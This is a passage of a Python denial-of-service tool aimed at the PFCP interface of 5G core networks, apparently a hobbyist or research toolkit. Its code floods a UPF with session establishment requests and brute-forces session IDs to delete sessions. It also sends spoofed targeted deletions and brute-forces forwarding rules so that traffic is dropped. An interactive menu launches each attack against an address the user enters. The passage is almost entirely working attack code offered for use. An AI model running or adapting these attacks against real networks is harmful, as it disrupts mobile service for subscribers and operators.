        pfcp_obj = PFCPToolkit(self.evil_addr, self.upf_addr, self.src_port, self.dest_port, verbose=self.verbose)
        thread_offset = 0
        start_time = time.time()
        for i in range(num_threads):
            count = per_thread + (1 if i < remaining else 0)
            t = threading.Thread(target=self.pfcp_session_deletion_bruteforce_worker, args=(count, thread_offset))
            t.start()
            threads.append(t)
            thread_offset += count
        
        for t in threads:
            t.join()
        if self.verbose:
            self.logger.success(f"PFCP session deletion bruteforce completed")
            
        end_time = time.time()
        duration = end_time - start_time
        pps = reqNbr / duration if duration > 0 else float("inf")
        self.logger.success(f"Sent {reqNbr} packets in {duration:.2f} seconds ({pps:.2f} pps)")
        self.logger.success(f"{len(self.valid_seid_list)} valid SEIDs found ({len(self.valid_seid_list) / reqNbr * 100:.2f}%)")

        
    
    def Start_pfcp_session_establishment_flood(self, reqNbr=100, num_threads=1):
        """
        Launch a multithreaded PFCP Session Establishment flood attack.

        Optionally prepares the PFCP session establishment packets in advance,
        then sends them over multiple threads to maximize throughput.

        Args:
            reqNbr (int, optional): Total number of PFCP session establishment requests to send. Defaults to 100.
            num_threads (int, optional): Number of concurrent threads to use for sending. Defaults to 1.

        Returns:
            None
        """

        if self.prepare:
            self.prepare_pfcp_session_establishment_flood(reqNbr)
        
        
        if self.verbose:
            self.logger.info(f"Starting PFCP session establishment flood with {reqNbr} requests and {num_threads} threads")
            
        
        threads = []
        per_thread = reqNbr // num_threads
        remaining = reqNbr % num_threads

        pfcp_obj = PFCPToolkit(self.evil_addr, self.upf_addr, self.src_port, self.dest_port, verbose=True)
        pfcp_association_packet = pfcp_obj.Build_PFCP_association_setup_req()
        
        start_time = time.time()
        
        try:
            send(pfcp_association_packet)
        except Exception as e:
            self.logger.error(f"Error sending PFCP association packet: {e}")
            
        
        thread_offset = 0
        for i in range(num_threads):
            count = per_thread + (1 if i < remaining else 0)
            t = threading.Thread(target=self.pfcp_session_establishment_flood_worker, args=(count, thread_offset +1))
            t.start()
            threads.append(t)
            thread_offset += count

        for t in threads:
            t.join()
        end_time = time.time()

        if self.verbose:
            self.logger.success(f"PFCP session establishment flood completed")
            
        
        duration = end_time - start_time
        pps = reqNbr / duration if duration > 0 else float("inf")
        self.logger.success(f"Sent {reqNbr} packets in {duration:.2f} seconds ({pps:.2f} pps)")
        
    
    def Start_pfcp_session_deletion_targeted(self, target_seid, smf_addr=None, upf_addr=None, src_port=None, dest_port=None):
        """
        Send a targeted PFCP Session Deletion Request to a specific UPF.

        Constructs and sends a deletion request for a specified SEID,
        optionally overriding the source (SMF) and destination (UPF) addresses and ports.

        Args:
            target_seid (int): SEID of the session to delete.
            smf_addr (str, optional): Source IPv4 address (SMF). Defaults to instance's smf_addr.
            upf_addr (str, optional): Destination IPv4 address (UPF). Defaults to instance's upf_addr.
            src_port (int, optional): UDP source port. Defaults to instance's src_port.
            dest_port (int, optional): UDP destination port. Defaults to instance's dest_port.

        Returns:
            None
        """

        upf_addr = upf_addr or self.upf_addr
        smf_addr = smf_addr or self.smf_addr
        src_port = src_port or self.src_port
        dest_port = dest_port or self.dest_port
        
        if not self.paramsHandler.check_parameters({
            "upf_addr": upf_addr,
            "smf_addr": smf_addr,
            "src_port": src_port,
            "dest_port": dest_port,
            "target_seid": target_seid
            
        }, "[Start_pfcp_session_deletion_targeted]"):
            return


        if self.verbose:
            self.logger.info(f"Sending PFCP session deletion packet to {upf_addr} with SEID {target_seid}")
            
        
        PFCPToolkit_obj = PFCPToolkit(src_addr=smf_addr,
                              dest_addr=upf_addr,
                              src_port=src_port,
                              dest_port=dest_port)
        
        PFCPToolkit_obj.Send_PFCP_session_deletion_req(seid=target_seid)
        
        
        if self.verbose:
            self.logger.success(f"PFCP session deletion packet sent to {upf_addr} with SEID {target_seid}")
    
    def Start_pfcp_session_modification_far_drop_bruteforce(self, far_range, session_range, evil_addr=None, upf_addr=None, src_port=None, dest_port=None):
        """
        Launch a brute-force attack by sending PFCP Session Modification Requests targeting FARs.

        Iterates over a range of SEIDs and FAR IDs, attempting to modify forwarding actions
        and checking for successful responses from the UPF.

        Args:
            far_range (int): Number of FAR IDs to try for each SEID.
            session_range (int): Number of SEIDs (sessions) to target.
            evil_addr (str, optional): Source IPv4 address for the PFCP messages. Defaults to instance's evil_addr.
            upf_addr (str, optional): Destination IPv4 address (UPF). Defaults to instance's upf_addr.
            src_port (int, optional): UDP source port. Defaults to instance's src_port.
            dest_port (int, optional): UDP destination port. Defaults to instance's dest_port.

        Returns:
            None
        """

        if not self.paramsHandler.check_parameters({
            "far_range": far_range,
            "session_range": session_range,
            "evil_addr": evil_addr,
            "upf_addr": upf_addr,
            "src_port": src_port,
            "dest_port": dest_port
        }, "[Start_pfcp_session_modification_far_drop_bruteforce]"):
            return
        
        
        PFCPToolkit_obj= PFCPToolkit(src_addr=EVIL_ADDR, dest_addr=UPF_ADDR, src_port=SRC_PORT, dest_port=DEST_PORT)
        for seid in range(1, session_range):
            
            for farId in range(1, far_range):
                packet = PFCPToolkit_obj.Build_PFCP_session_modification_req(seid=seid, far_id=farId)
                res = sr1(packet)
                pfcp_cause = None
                for ie in res[PFCP].IE_list:
                    if isinstance(ie, IE_Cause):
                        pfcp_cause = ie.cause
                        break
                
                if pfcp_cause == 1:
                    self.logger.success(f"PFCP Session Modification Request accepted, SEID: {hex(seid)}, FAR_ID: {hex(farId)}")
            
        




########## UTILISATION PFCPToolkit

# # option 1: (mieux si on veut faire plusieurs requêtes sur le même upf)
# objet_test = PFCPToolkit(EVIL_ADDR, UPF_ADDR, SRC_PORT, DEST_PORT, verbose=True)
# objet_test.Send_PFCP_association_setup_req()
# objet_test.Send_PFCP_session_establishment_req(seid=0xC0FFEE, ue_addr="1.1.1.1")

# # option 2: (plus modulable)
# PFCPToolkit().Send_PFCP_association_setup_req(EVIL_ADDR, UPF_ADDR, SRC_PORT, DEST_PORT)
# PFCPToolkit().Send_PFCP_session_establishment_req(EVIL_ADDR, UPF_ADDR, SRC_PORT, DEST_PORT, 
#                                               seid=0xC0FFEE, ue_addr="1.1.1.1")



########## UTILISATION PFCPDosAttack

### SESSION ESTABLISHMENT FLOOD ATTACK (DoS)
# objet_dos = PFCPDosAttack(EVIL_ADDR, UPF_ADDR, SRC_PORT, DEST_PORT)
# objet_dos.set_verbose(True)
# objet_dos.set_randomize(True)

# objet_dos.set_random_far_number(int(sys.argv[3]))
# objet_dos.Start_pfcp_session_establishment_flood(reqNbr=int(sys.argv[1]), num_threads=int(sys.argv[2]))


### SESSION DELETION ATTACK (targeted DoS)
# objet_dos = PFCPDosAttack(EVIL_ADDR, UPF_ADDR, SRC_PORT, DEST_PORT)
# objet_dos.set_verbose(True)
# objet_dos.Start_pfcp_session_deletion_targeted(smf_addr=sys.argv[1], target_seid=int(sys.argv[2], 0))


### SESSION DELETION ATTACK (DoS)
# objet_dos = PFCPDosAttack(EVIL_ADDR, UPF_ADDR, SRC_PORT, DEST_PORT)
# objet_dos.set_verbose(True)
# objet_dos.Start_pfcp_session_deletion_bruteforce(reqNbr=int(sys.argv[1]), num_threads=int(sys.argv[2]))


def main():
    
    print("PFCPToolkit and PFCPDosAttack demo script")
    print("Coded with <3 by nxvertime")
    print("---------------------------------------\n")
    
    print("Choose an attack : ")
    print("[1]  PFCP Session Establishment Flood")
    print("[2]  PFCP Session Deletion Flood")
    print("[3]  PFCP Session Deletion Targeted")
    print("[4]  PFCP Session Modification FAR Drop")
    
    usr_input = input("# ")
    choice = None
    try:
        choice = int(usr_input)
    except ValueError:
        print("Invalid input. Please enter a number.")
        return
    
    if choice == 1:
        print("PFCP Session Establishment Flood selected")
        
        print(f"Enter your IP address (evil_addr) [default: {EVIL_ADDR}]: ")
        evil_addr = input("# ") or EVIL_ADDR
        print(f"Enter the UPF address (upf_addr) [default: {UPF_ADDR}]: ")
        upf_addr = input("# ") or UPF_ADDR
        print(f"Enter the source port (src_port) [default: {SRC_PORT}]: ")
        src_port = int(input("# ") or SRC_PORT)
        print(f"Enter the destination port (dest_port) [default: {DEST_PORT}]: ")
        dest_port = int(input("# ") or DEST_PORT)
        
        print("Number of requests: ")
        reqNbr = int(input("# "))
        print("Number of threads: ")
        num_threads = int(input("# "))
        print("Random FAR number (0 to disable): ")
        random_far_number = int(input("# "))
        
        dos_obj = PFCPDosAttack(evil_addr, upf_addr, src_port, dest_port, verbose=True)
        dos_obj.set_random_far_number(random_far_number)

        dos_obj.Start_pfcp_session_establishment_flood(reqNbr=reqNbr, num_threads=num_threads)
        
    if choice == 2:
        print("PFCP Session Deletion Flood selected")
        
        print(f"Enter your IP address (evil_addr) [default: {EVIL_ADDR}]: ")
        evil_addr = input("# ") or EVIL_ADDR
        print(f"Enter the UPF address (upf_addr) [default: {UPF_ADDR}]: ")
        upf_addr = input("# ") or UPF_ADDR
        print(f"Enter the source port (src_port) [default: {SRC_PORT}]: ")
        src_port = int(input("# ") or SRC_PORT)
        print(f"Enter the destination port (dest_port) [default: {DEST_PORT}]: ")
        dest_port = int(input("# ") or DEST_PORT)
        
        print("Number of requests: ")
        reqNbr = int(input("# "))
        print("Number of threads: ")
        num_threads = int(input("# "))
        
        dos_obj = PFCPDosAttack(evil_addr, upf_addr, src_port, dest_port, verbose=True)
        dos_obj.Start_pfcp_session_deletion_bruteforce(reqNbr=reqNbr, num_threads=num_threads)

    if choice == 3:
        print("PFCP Session Deletion Targeted selected")
        
        print(f"Enter your IP address (evil_addr) [default: {EVIL_ADDR}]: ")
        evil_addr = input("# ") or EVIL_ADDR
        print(f"Enter the UPF address (upf_addr) [default: {UPF_ADDR}]: ")
        upf_addr = input("# ") or UPF_ADDR
        print(f"Enter the source port (src_port) [default: {SRC_PORT}]: ")
        src_port = int(input("# ") or SRC_PORT)
        print(f"Enter the destination port (dest_port) [default: {DEST_PORT}]: ")
        dest_port = int(input("# ") or DEST_PORT)
        
        print("SEID to delete (in hex): ")
        target_seid = int(input("# "), 0)
        
        dos_obj = PFCPDosAttack(evil_addr, upf_addr, src_port, dest_port, verbose=True)
        dos_obj.Start_pfcp_session_deletion_targeted(target_seid=target_seid, smf_addr=evil_addr)
    
    if choice == 4:
        print("PFCP Session Modification FAR Drop selected")
        
        print(f"Enter your IP address (evil_addr) [default: {EVIL_ADDR}]: ")
        evil_addr = input("# ") or EVIL_ADDR
        print(f"Enter the UPF address (upf_addr) [default: {UPF_ADDR}]: ")
        upf_addr = input("# ") or UPF_ADDR
        print(f"Enter the source port (src_port) [default: {SRC_PORT}]: ")
        src_port = int(input("# ") or SRC_PORT)
        print(f"Enter the destination port (dest_port) [default: {DEST_PORT}]: ")
        dest_port = int(input("# ") or DEST_PORT)
        
        print("Enter the FAR range: ")
        far_range = int(input("# "))
        print("Enter the Session range: ")
        session_range = int(input("# "))
        
        dos_obj = PFCPDosAttack(evil_addr, upf_addr, src_port, dest_port, verbose=True)
        dos_obj.Start_pfcp_session_modification_far_drop_bruteforce(far_range=far_range, session_range=session_range)
        

if __name__ == "__main__":
    main()
    
    
    